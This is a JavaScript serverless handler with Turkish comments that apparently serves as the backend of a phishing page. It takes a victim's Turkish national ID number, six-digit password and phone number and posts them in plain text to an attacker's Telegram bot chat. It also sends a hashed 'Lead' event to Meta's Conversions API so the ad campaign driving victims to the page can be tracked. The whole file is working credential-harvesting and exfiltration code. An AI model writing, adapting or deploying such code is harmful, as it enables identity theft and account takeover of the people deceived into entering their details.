import axios from 'axios';
import dotenv from 'dotenv';
import crypto from 'crypto'; // Node.js built-in, SHA-256 için

dotenv.config();

export default async function handler(req, res) {
  // CORS: Vercel'de frontend domain'ini ekle (örn. https://your-frontend.vercel.app)
  res.setHeader('Access-Control-Allow-Origin', '*'); // Test için; production'da spesifik domain
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  // OPTIONS preflight için
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Yalnızca POST istekleri desteklenir.' });
  }
  try {
    // Next.js built-in body parsing (req.body direkt JSON)
    const { tc, password, phone } = req.body || {};
   
    // Validation
    if (!tc || tc.length !== 11 || !/^\d+$/.test(tc)) {
      return res.status(400).json({ message: 'Geçersiz TC numarası.' });
    }
    if (!password || password.length !== 6 || !/^\d+$/.test(password)) {
      return res.status(400).json({ message: 'Geçersiz şifre.' });
    }
    if (!phone || phone.length !== 10 || !/^\d+$/.test(phone)) {
      return res.status(400).json({ message: 'Geçersiz telefon numarası.' });
    }
    const message = `TC: ${tc}\nŞifre: ${password}\nTelefon Numarası: ${phone}`;
    console.log('Gönderilen veri:', { tc, password, phone });
    // Env check (Vercel'de set edilmiş olmalı)
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!token || !chatId) {
      console.error('Telegram env eksik!');
      return res.status(500).json({ message: 'Sunucu config hatası.' });
    }
    const response = await axios.post(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        chat_id: chatId,
        text: message,
      },
      { timeout: 10000 } // 10s timeout, Vercel için
    );
   
    console.log('Telegram yanıtı:', response.data);
   
    if (response.data.ok) {
      // Telegram başarılıysa, Conversions API'ye server-side Lead event'i gönder
      try {
        const normalizedPhone = `+90${phone}`; // Telefonu normalize et

        // SHA-256 hash fonksiyonu (Node.js crypto ile)
        const hashData = (data) => {
          return crypto.createHash('sha256').update(data.toLowerCase().trim()).digest('hex');
        };

        const hashedPhone = hashData(normalizedPhone);
        const hashedTc = hashData(tc);

        // Dinamik URL: Mevcut host'tan al (Vercel uyumlu)
        const currentHost = req.headers['x-forwarded-host'] || req.headers['host'] || 'fallback-domain.com'; // Fallback değiştir
        const protocol = req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
        const dynamicUrl = `${protocol}://${currentHost}/telefon`; // /telefon sayfası için

        // Conversions API payload
        const payload = {
          data: [
            {
              event_name: 'Lead',
              event_time: Math.floor(Date.now() / 1000), // Unix timestamp
              action_source: 'website',
              event_source_url: dynamicUrl, // Dinamik URL
              event_id: `lead_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`, // Benzersiz ID (client-side ile aynı tut)
              user_data: {
                ph: [hashedPhone], // Hashed telefon
                external_id: [hashedTc], // Hashed TC
                client_ip_address: req.headers['x-forwarded-for'] || req.socket.remoteAddress || '', // IP (Vercel için)
                client_user_agent: req.headers['user-agent'] || 'unknown'
              },
              custom_data: {
                content_category: 'lead_form',
                content_name: 'phone_verification'
                // Şifre eklenmez (hassas veri)
              }
            }
          ]
        };

        // Env'den Meta token'ını al (Vercel'de META_CONVERSIONS_TOKEN olarak set et)
        const metaToken = process.env.META_CONVERSIONS_TOKEN;
        const pixelId = process.env.META_PIXEL_ID; // Env'den oku (fallback kaldırıldı)

        if (!metaToken || !pixelId) {
          console.error('Meta Conversions token veya Pixel ID eksik! Env: META_CONVERSIONS_TOKEN ve META_PIXEL_ID');
        } else {
          const metaResponse = await axios.post(
            `https://graph.facebook.com/v20.0/${pixelId}/events?access_token=${metaToken}`,
            payload,
            { timeout: 10000 }
          );
          console.log('Conversions API yanıtı:', metaResponse.data);
          if (metaResponse.data.events_received) {
            console.log(`Başarılı: ${metaResponse.data.events_received} event gönderildi.`);
          } else {
            console.error('Conversions API hatası:', metaResponse.data);
          }
        }
      } catch (metaError) {
        console.error('Conversions API hatası:', metaError.message);
        // Telegram başarılı olduğu için devam et, Meta hatası lead'i etkilemez
      }

      return res.status(200).json({ message: 'Bilgiler gönderildi.' });
    } else {
      console.error('TG API hatası:', response.data);
      return res.status(500).json({ message: 'Telegram gönderimi başarısız.', details: response.data.description });
    }
   
  } catch (error) {
    console.error('Handler hatası:', error.message, error.response?.data);
    return res.status(500).json({ message: 'Hata oluştu.', details: error.message });
  }
}